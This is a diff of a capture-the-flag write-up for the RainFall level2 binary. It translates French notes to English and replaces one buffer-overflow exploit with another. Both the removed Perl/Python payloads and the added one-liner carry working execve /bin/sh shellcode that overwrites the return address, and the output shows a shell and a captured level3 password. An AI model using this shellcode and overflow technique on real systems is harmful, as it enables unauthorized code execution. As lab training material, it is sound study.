@@ -128,60 +128,26 @@ Program received signal SIGSEGV, Segmentation fault.
 0x37634136 = 37 63 41 36 = (in ascii) 7 c A 6, is in little Endian so if i reverse this 6Ac7
 In my long string '6Ac7' Start at the 80th character
 
- Buffer start
-      | ---------- Shellcode (n bytes) --------- |
-      | -------- Padding (80 - n bytes) -------- |
-      | -- Return address 0x80484cf (4 bytes) -- |
-Buffer end (84 bytes total)
-
-We can write then an exploit :
-
-$NOP = "\x90";
-$SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31
-\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50
-\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
-$XC = "\xCC"x(80-55-4) ."\xeb\x85\x04\x08";
-
-print $NOP x 4 . $SHELLCODE . $XC;
-
-And execute it : 
-
-level2@RainFall:~$ perl /tmp/exploit.pl | ./level2
-����1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
-                                               ̀������������������
-$ echo hi
-hi
-$ whoami
-level3
-$
-
-
-
-(python -c 'print "\x90" * 8 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\xCC" * 17 + "\xeb\x85\x04\x08"') | ./level2
-
-
-Notre shellcode fait 55 caractere, et notre buffer fait 64, mais on sait qu'on
-segafault a 80.
-Donc on doit remplire la place pour avoir la main sur l'eip.
-Mais faire attention a ne pas mettre notre shellcode a dela de la taille du
-buffer.
-Entre 64 et 80, c'est de la place alloue pour d'autre variable.
-Donc notre shellcode peux se faire modifier si on le met n'import ou.
+Our shellcode is 55 char long, our buffer is 64 long and we kmow that the binary segfault at 80.
+In order to gain control of EIP we must fill that space in memory.
+We need to be careful to not put our shellcode beyond the buffer' size.
+Between 64 and 80, is the memory space allocated for other variables.
+So our shellcode may be modified if we place it anywhere.
 
 Exemple:
 	0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   	0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
 
-Ici le binaire check si l'adresse de retour n'est pas dans la stack,
-pour bloquer les ret2libc.
+Here the binary checks if the return address from the function isn't from the stack to 
+block any ret2lib exploit.
 
-Exemple avec les adresses de "systeme" et "/bin/sh"
+Exemple with addresses from "system" and "/bin/sh"
 	level2@RainFall:~$ python -c 'print "A" * 80 + "\x60\xb0\xe6\xb7" + "OUAI"
 	+ "\x58\xcc\xf8\xb7"' | ./level2
 	0xb7e6b060)
 
-Apres avoir fait le check il range la valeur a ebp - 0xc,
-Voila la memoire si on remplie 80 "A":
+After checking, the value is stored at ebp - 0xc.
+Here is the memory if we fill it with 80 "A".
 
 0xbffff6ac:	0x41414141	0x41414141	0x41414141	0x41414141
 0xbffff6bc:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -190,7 +156,7 @@ Voila la memoire si on remplie 80 "A":
 0xbffff6ec:	0x08048500	0x41414141	0x41414141	0x41414141
 0xbffff6fc:	0x08048500	0x08048550	0x00000000	0x00000000
 
-On voit bien qu'il range ca valeur apres 64 bits 
+We can clearly see the storing of its value after 64 bits.
 
 The RET instruction pops the return address off the stack (which is pointed to by the stack pointer register) and then continues execution at that address.
 
@@ -198,3 +164,9 @@ level2@RainFall:~$ objdump -d level2 | grep "call" | grep "*%eax"
  80484cf:	ff d0                	call   *%eax
  80485eb:	ff d0                	call   *%eax
 
+
+level2@RainFall:~$ (python -c 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * 25 + "\xeb\x85\x04\x08"') | ./level2
+1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
+                                           ̀AAAAAAAAAAAAAAAAAAAAA�
+$ cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
